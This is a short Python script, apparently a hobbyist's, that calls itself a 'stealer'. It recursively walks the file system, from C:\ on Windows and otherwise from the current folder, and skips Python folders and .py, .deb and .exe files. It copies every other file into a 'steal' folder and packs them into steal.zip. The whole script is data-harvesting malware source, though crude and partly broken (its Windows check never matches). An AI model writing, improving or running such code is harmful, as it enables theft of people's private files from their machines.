#Author: SergioZ3R0
#region Imports
import os
import sys
import zipfile
import shutil
#endregion
#region Definitions
files = [] # List to store the files in the current directory
def recorrer_arbol_directorios(directory):
    global files
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    # Ignora los directorios relacionados con Python
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    if file.endswith(".py") or file.endswith(".deb") or file.endswith(".exe") :
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except Exception as e:
        print(f"Error finding files: {e}")
    print(files)
def comprimir_archivos(nombre_archivo_zip, archivos_a_comprimir):
    with zipfile.ZipFile(nombre_archivo_zip, 'w') as archivo_zip:
        for archivo in archivos_a_comprimir:
            archivo_zip.write(archivo)

def stealer(files):
    if os.path.exists("steal"):
        pass
    else:
        os.mkdir("steal")
    for file in files:
        shutil.copy(file, "steal/")
        if file == files[-1]:
            comprimir_archivos("./steal.zip", files)
#endregion
if sys.platform == "windows":
    recorrer_arbol_directorios("C:\\")
else:
    recorrer_arbol_directorios("./")
stealer(files)

